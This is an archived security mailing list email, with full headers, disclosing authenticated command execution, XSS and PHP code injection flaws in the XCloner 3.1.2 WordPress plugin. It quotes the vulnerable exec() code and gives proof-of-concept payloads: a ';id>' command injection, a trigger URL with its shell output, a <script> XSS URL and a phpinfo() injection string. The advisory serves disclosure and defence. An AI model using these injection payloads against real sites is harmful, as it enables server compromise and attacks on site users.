X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3459" "Friday" "5" "June" "2015" "11:27:28" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<2C131A1D-288B-4211-9275-BAA8831E7C7E@me.com>" "88" "[oss-security] Xloner v3.1.2 wordpress plugin authenticated command execution and XSS" nil nil nil "6" "2015060515:27:28" "[oss-security] Xloner v3.1.2 wordpress plugin authenticated command execution and XSS" (number mark "        larry0@me.co Jun  5   88/3459  " thread-indent "\"[oss-security] Xloner v3.1.2 wordpress plugin authenticated command execution and XSS\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 22283 invoked by uid 550); 5 Jun 2015 15:29:16 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19671 invoked from network); 5 Jun 2015 15:27:43 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-06-05_13:2015-06-05,2015-06-05,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506050200
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <2C131A1D-288B-4211-9275-BAA8831E7C7E@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Fri, 05 Jun 2015 11:27:28 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Xloner v3.1.2 wordpress plugin authenticated command execution and XSS
To: Open Source Security <oss-security@lists.openwall.com>,
 fulldisclosure@seclists.org


This advisory is in addition to the one I filed in November http://www.open=
wall.com/lists/oss-security/2014/11/06/1 that had the following CVEs
assigned CVE-2014-8603 CVE-2014-8604 CVE-2014-8605 CVE-2014-8606 CVE-2014-8=
607, advisory http://www.vapid.dhs.org/advisory.php?v=3D110.



Title: Xloner v3.1.2 wordpress plugin authenticated command execution and X=
SS
Author: Larry W. Cashdollar, @_larry0
Date: 2015-05-10
Download Site: https://wordpress.org/plugins/xclonerbackupandrestore/ http:=
//extensions.joomla.org/extensions/accessasecurity/ sitesecurity/ backup/665
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D121
Vendor: Ovidiu Liuta, @thinkovi
Vendor Contact: @thinkovi
Description: XCloner is a Backup and Restore component designed for PHP/Mys=
ql websites, it can work as a native plugin for WordPress and Joomla!
Vulnerability:
Lines 1129 of 1135 in cloner.functions.php

1129 $excluded_cmd =3D "";
1130 if ($fp =3D @fopen($_REQUEST['
1130 if ($fp =3D @fopen($_REQUEST['excl_manual'], "r")) {
1131 while (!feof($fp))
1132 $excluded_cmd .=3D fread($fp, 1024);
1133
1134 fclose($fp);
1135 }

Line 1205:
If configured for manual mode the contents of $excluded_cmd are passed to e=
xec();
1205 exec($_CONFIG[tarpath] . " $excluded_cmd ". $_CONFIG['tarcompress'] ."=
vf $backup_file update $file");
We need to supply a file with a list of commands to execute in it, we can c=
reate this via the backup comments feature. It creates a file under adminis=
trator/backups/.comments with whatever you want in it. Like ;id>/tmp/w00t;

Then change the configuration to manual backup by selecting the radio butto=
n and perform a backup.
Hit this link:
http://www.vapidlabs.internal/wpadmin/plugins.php?page=3Dxcloner_show&optio=
n=3Dcom_cloner&task=3Drefresh&json=3D0&startf=3D300&lines=3D6204&backup=3Db=
ackup_20150511_
2028_sqlnodrop.tar&excl_manual=3D/usr/share/wordpress/administrator/backups=
/.comments

In a shell:
$ cat /tmp/w00t
uid=3D33(wwwdata)
gid=3D33(wwwdata)
groups=3D33(wwwdata)

Also $excluded_cmd is XSS

http://www.vapidlabs.internal/wpadmin/plugins.php?page=3Dxcloner_show&optio=
n=3Dcom_cloner&task=3Drefresh&json=3D0&startf=3D800&lines=3D6204&backup=3Db=
ackup_20150511_
2028_sqlnodrop.tar&excl_manual=3D=E2=80=99><script>alert(=E2=80=98w00t=E2=
=80=99);</script>

Chrome XSS alert:

The XSS Auditor refused to execute a script in
'http://www.vapidlabs.internal/wpadmin/plugins.php?page=3Dxcloner_show&opti=
on=3Dcom_=E2=80=A6lnodrop.tar&excl_manual=3D%27%3E%3Cscript%3Ealert(%27w00t=
%27);%3C/script%3E' because
its source code was found within the request. The auditor was enabled as th=
e server sent
neither an 'XXSSProtection' nor 'ContentSecurityPolicy' header.
plugins.php:403 The XSS Auditor refused to execute a script in
'http://www.vapidlabs.internal/wpadmin/plugins.php?page=3Dxcloner_show&opti=
on=3Dcom_=E2=80=A6lno
drop.tar&excl_manual=3D%27%3E%3Cscript%3Ealert(%27w00t%27);%3C/script%3E' b=
ecause
its source code was found within the request. The auditor was enabled as th=
e server sent
neither an 'XXSSProtection' nor 'ContentSecurityPolicy' header.

The default template has an error with the LM_LOGIN_TEXT field so just clea=
n that out or you=E2=80=99ll get a syntax error when trying to execute.
Adding foo=E2=80=9D);phpinfo();define(=E2=80=9Cfoo to the Translation LM_FR=
ONT_* fields then browsing to language/italian.php you=E2=80=99ll execute p=
hpinfo();.

CVEID: 2015-4336 2015-4337 2015-4338=
